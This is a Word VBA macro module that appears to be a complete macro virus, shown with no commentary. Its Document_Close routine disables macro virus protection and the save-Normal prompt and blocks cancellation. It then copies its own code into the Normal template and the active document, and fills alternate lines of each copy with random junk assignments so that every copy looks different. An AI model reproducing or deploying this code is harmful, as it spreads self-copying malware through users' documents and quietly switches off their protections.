   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub Document_Close()

   On Error Resume Next

   Options.SaveNormalPrompt = 0

   Options.VirusProtection = 0

   Options.ConfirmConversions = 0

   JF2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

   Application.EnableCancelKey = 0

   HU49 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

   If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

   Set AD36 = ActiveDocument.VBProject.VBComponents.Item(1)

   GU78 = True

   End If

   If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

   Set AD36 = NormalTemplate.VBProject.VBComponents.Item(1)

   UV8 = True

   End If

   If UV8 <> True And GU78 <> True Then GoTo SK26

   If UV8 = True Then AD36.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, JF2 - 1))

   If GU78 = True Then AD36.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, HU49 - 1))

   With AD36.CodeModule

   For x = 2 To (AD36.CodeModule.CountOfLines - 1) Step 2

   For y = 1 To (Int(Rnd * 10) + 2)

   UP45 = UP45 + (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & " + "

   Next y

   .replaceline x, (Chr(65 + Int(Rnd * 22))) & " = " & UP45 & (Chr(65 + Int(Rnd * 22)))

   UP45 = ""

   Next x

   End With

   SK26:

   End Sub
